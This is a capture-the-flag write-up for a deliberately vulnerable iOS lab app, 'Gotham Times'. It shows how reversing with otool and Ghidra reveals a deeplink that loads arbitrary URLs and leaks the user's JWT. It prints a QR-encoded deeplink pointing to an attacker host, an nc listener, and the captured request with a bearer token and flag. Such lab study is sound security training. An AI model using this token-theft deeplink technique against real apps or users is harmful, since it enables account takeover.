**Description**: Welcome to the **iOS Application Security Lab: Deeplink Exploitation Challenge**. The challenge is built around the fictional newspaper Gotham Times, an iOS application providing users with the latest news and updates about events happening in Gotham City. This challenge focuses on the potential vulnerabilities in the deep link feature, emphasizing how attackers can exploit it to gain unauthorized access to sensitive information, particularly authentication tokens. As an attacker, your goal is to craft an exploit that can be used to steal user's authentication token.

**Download**: https://lautarovculic.com/my_files/gothamTimes.ipa
**Link:** https://www.mobilehackinglab.com/path-player?courseid=lab-gotham-times

![[gothamTimes1.png]]

Install an **IPA** file can be difficult.
So, for make it more easy, I made a YouTube video with the process using **Sideloadly**.
**LINK**: https://www.youtube.com/watch?v=YPpo9owRKGE

**NOTE**: If you have problems with the keyboard and UI (buttons) when you need to hide it on a physical device, you can fix this problem by using the `KeyboardTools` by `@CrazyMind90` found in the Sileo app store.

Once you have the app installed, let's proceed with the challenge.
**unzip** the **`.ipa`** file.
Let's examine the **`Info.plist`** file.
```bash
cd Payload/Gotham\ Times.app && plutil -convert xml1 Info.plist && cat Info.plist
```

We can find this **URL Scheme** (`CFBundleURLSchemes`)
```XML
<array>
    <dict>
        <key>CFBundleTypeRole</key>
        <string>Viewer</string>
        <key>CFBundleURLName</key>
        <string>com.mobilehackinglab.Gotham-Times</string>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>gothamtimes</string>
        </array>
    </dict>
</array>
```

So, let's analyze if we can found some interesting functions or some related
```bash
strings "Gotham Times" | grep -iE "token|openURL|auth|gothamtimes"
```

Output:
```bash
ySo16UIOpenURLContextC_G
JWTToken
token
Authorization
gothamtimes
v40@0:8@"WKWebView"16@"NSURLAuthenticationChallenge"24@?<v@?q@"NSURLCredential">32
v40@0:8@"WKWebView"16@"NSURLAuthenticationChallenge"24@?<v@?B>32
openURL:options:completionHandler:
webView:didReceiveAuthenticationChallenge:completionHandler:
webView:authenticationChallenge:shouldAllowDeprecatedTLS:
application:handleOpenURL:
application:openURL:sourceApplication:annotation:
application:openURL:options:
application:didRegisterForRemoteNotificationsWithDeviceToken:
applicationShouldRequestHealthAuthorization:
scene:openURLContexts:
```

Now, we can use *otool* for decompile and inspect better these functions
```bash
otool -tv 'Gotham Times' | grep  -iE "token|openURL|auth|gothamtimes"
```

Output:
```bash
_$s12Gotham_Times12saveJWTToken5tokenySS_tF:
0000000100008190	add	x0, x0, #0x370 ; literal pool for: "JWTToken"
_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF:
000000010000877c	add	x0, x0, #0x370 ; literal pool for: "JWTToken"
_$s12Gotham_Times20authenticatedRequest3url10Foundation10URLRequestVSS_tF:
0000000100009908	bl	_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF
0000000100009a18	add	x0, x0, #0x3f4 ; literal pool for: "token"
0000000100009c00	add	x0, x0, #0x4d8 ; literal pool for: "Authorization"
000000010000a618	bl	_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF
000000010000ade0	add	x0, x0, #0x3f4 ; literal pool for: "token"
000000010000b914	add	x0, x0, #0x4d8 ; literal pool for: "Authorization"
000000010000ba28	add	x0, x0, #0x3f4 ; literal pool for: "token"
000000010000bdd4	add	x0, x0, #0x4eb ; literal pool for: "gothamtimes"
000000010000d554	bl	_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF
000000010000d800	bl	_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF
000000010000eca4	bl	_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF
000000010000fcbc	bl	_$s12Gotham_Times20authenticatedRequest3url10Foundation10URLRequestVSS_tF
0000000100010fd4	bl	_$s12Gotham_Times12saveJWTToken5tokenySS_tF
0000000100011414	bl	_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF
00000001000115fc	bl	_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF
0000000100011878	bl	_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF
00000001000125c0	bl	_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF
00000001000154c0	bl	_$s12Gotham_Times12saveJWTToken5tokenySS_tF
0000000100015904	bl	_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF
0000000100015ba4	bl	_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF
_$s12Gotham_Times13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtF:
0000000100019284	bl	_$sSo16UIOpenURLContextCMa
000000010001928c	bl	_$sSo16UIOpenURLContextCSo8NSObjectCSH10ObjectiveCWl
0000000100019aa8	bl	_$sSh8IteratorVySo16UIOpenURLContextC_GWOh
_$sSo16UIOpenURLContextCMa:
_$sSo16UIOpenURLContextCSo8NSObjectCSH10ObjectiveCWl:
0000000100019b64	bl	_$sSo16UIOpenURLContextCMa
_$sSh8IteratorVySo16UIOpenURLContextC_GWOh:
_$s12Gotham_Times13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtFTo:
0000000100019dc4	bl	_$sSo16UIOpenURLContextCMa
0000000100019dcc	bl	_$sSo16UIOpenURLContextCSo8NSObjectCSH10ObjectiveCWl
0000000100019dec	bl	_$s12Gotham_Times13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtF
000000010001a3d8	bl	_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF
000000010001c898	bl	_$s12Gotham_Times12saveJWTToken5tokenySS_tF
000000010001d3dc	bl	_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF
000000010001d67c	bl	_$s12Gotham_Times11getJWTTokenSDyS2SGSgyF
```

Now that we know better the *functions names* we can use **Ghidra** for an deep understanding of the application behavior.

Our interested class is
`_TtC12Gotham_Times13SceneDelegate`
Where we have the function
`void _TtC12Gotham_Times13SceneDelegate::scene:openURLContexts:`
```C
void _TtC12Gotham_Times13SceneDelegate::scene:openURLContexts:(ID param_1, SEL param_2, ID param_3, ID param_4)
{
    Set<undefined> openURLContexts;
  
    _objc_retain();
    _objc_retain(param_4);
    _objc_retain(param_1);
    __C::UIOpenURLContext::typeMetadataAccessor();
    __C::UIOpenURLContext::$lazy_protocol_witness_table_accessor();
    openURLContexts = (extension_Foundation)::Swift::Set::$_unconditionallyBridgeFromObjectiveC();
    Gotham_Times::SceneDelegate::scene((SceneDelegate *)param_1, (UIScene *)param_3, (Set<>)openURLContexts.unknown);
    _swift_bridgeObjectRelease(openURLContexts.unknown);
    _objc_release(param_4);
    _objc_release(param_1);
    _objc_release(param_3);
    return;
}
```

This call to `Gotham_Times::SceneDelegate::scene`
```C
Foundation::URL::$_unconditionallyBridgeFromObjectiveC(UVar11);
local_250 = *(code **)(local_198 + 0x10);
iVar20 = local_168;
(*local_250)(UVar13.unknown, local_168, local_1a0);
Foundation::URL::$get_host(UVar13);
local_248 = *(code **)(local_198 + 8);
local_238 = UVar13.unknown;
local_230 = iVar20;
(*local_248)(local_178, local_1a0);
(*local_248)(local_168, local_1a0);
_swift_bridgeObjectRetain(local_230);
SVar26 = Swift::String::init("open", 4, 1);
local_228 = (char *)SVar26.bridgeObject;
local_240 = SVar26.str;
_swift_bridgeObjectRetain();
local_d0 = local_238;
local_c8 = local_230;
local_c0 = local_240;
local_b8 = local_228;

if (local_230 == 0) {
    if (local_228 != (char *)0x0) 
        goto LAB_1000195a4;
    $outlined_destroy_of_Swift.String?(&local_d0);
    local_2a4 = 1;
} else {
    $outlined_init_with_copy_of_Swift.String?(&local_d0, &local_140);
    if (local_b8 == (char *)0x0) {
        $outlined_destroy_of_Swift.String(&local_140);
LAB_1000195a4:
        $outlined_destroy_of_(Swift.String?, Swift.String?)(&local_d0);
        local_2a4 = 0;
    } else {
        local_2d0 = local_140;
        local_2b8 = local_138;
        _swift_bridgeObjectRetain();
        local_2c8 = local_c0;
        local_2b0 = &local_d0;
        local_2c0 = local_b8;
        _swift_bridgeObjectRetain();
        SVar2.bridgeObject = local_2c0;
        SVar2.str = local_2c8;
        SVar27.bridgeObject = local_2b8;
        SVar27.str = local_2d0;
        SVar28.bridgeObject = in_x5;
        SVar28.str = pcVar12;
        pcVar22 = local_2c0;
        bVar6 = Swift::String::==_infix(SVar27, SVar2, SVar28);
        local_2a8 = (dword)CONCAT71(extraout_var, bVar6);
        _swift_bridgeObjectRelease(local_2c0);
        _swift_bridgeObjectRelease(local_2b8);
        _swift_bridgeObjectRelease(local_2c0);
        _swift_bridgeObjectRelease(local_2b8);
        $outlined_destroy_of_Swift.String?(local_2b0);
        local_2a4 = local_2a8;
    }
}

local_2d4 = local_2a4;
_swift_bridgeObjectRelease(local_228);
_swift_bridgeObjectRelease(local_230);
_objc_release(local_258);
UVar13.unknown = local_188;

if ((local_2d4 & 1) != 0) {
    UVar11.unknown = local_260;
    _objc_msgSend(local_260, "URL");
    _objc_retainAutoreleasedReturnValue();
    local_2f0 = UVar11.unknown;
}
```

Where
- The URL parameter is obtained from `UIOpenURLContext:`
```C
_objc_msgSend(local_260, "URL");
_objc_retainAutoreleasedReturnValue();
```
- Then, the URL is transformed with:
```C
Foundation::URL::$_unconditionallyBridgeFromObjectiveC(UVar11);
```
- Finally, the complete chain is obtained with:
```C
SVar26 = Foundation::URL::get_absoluteString(UVar13);
```
- You are getting the host of the URL with:
```C
Foundation::URL::$get_host(UVar13);
```

So, the **deeplink** looks like `gothamtimes://open?URL=`

This could lead to an **Open Redirect** or **Arbitrary URL load into Application** where we can **theft data (i.e. token)**.

We just need create an account, login, and then, open a browser or generate a QR code with the app running, then, go to any URL like
`gothamtimes://open?URL=http://192.168.1.75:8080`

```bash
qrencode "gothamtimes://open?url=http://192.168.1.75:8080" -o QR.png
```
Setup the **nc**
```bash
nc -nlv 8080
```

Scan the QR code and intercept the request with **burpsuite** and you'll get the **flag** and **token** (or in your *nc* session)
```HTTP
GET / HTTP/1.1
Host: 192.168.1.75:8080
Connection: keep-alive
flag: FLAG{d33ply-l1nk3d(t0-w3bk1t}
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImxhdXRhcm8iLCJpYXQiOjE3MzkxNDMwNzd9.X4gJnMic930UZe3w94TCx7xzYs0mw17Fqg_AHM2F7VY
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate, br
```

I hope you found it useful (: